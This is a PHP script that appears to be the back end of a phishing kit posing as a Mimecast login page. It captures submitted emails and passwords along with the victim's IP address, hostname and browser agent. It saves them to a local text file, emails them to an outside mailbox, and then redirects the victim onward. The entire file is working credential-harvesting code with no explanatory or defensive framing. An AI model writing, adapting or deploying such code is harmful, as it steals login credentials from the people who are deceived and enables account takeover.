<?php
session_start();
ob_start();

//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];



//Getting UserID info from Session
$_SESSION['username'] = $username = $_POST['email'];
$_SESSION['password'] = $password = $_POST['psw'];



$jayd="==================+[ User Info - LION ]+==================
Email: $username
Password   : $password
-------------------+	+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

$fp = fopen('ahmed.txt','a');
$savestring = $jayd."\n";
fwrite($fp, $savestring);
fclose($fp);

$recipient="cho_gwin@163.com";
$subject ="WELCOME LOGZ MIMECAST"."\n";
$headers = "From: JAY";

$Redirect="loginX.php?userid=$username";

if(mail($recipient,$subject,$jayd,$headers)){
    
header("Location: $Redirect");

}

?>

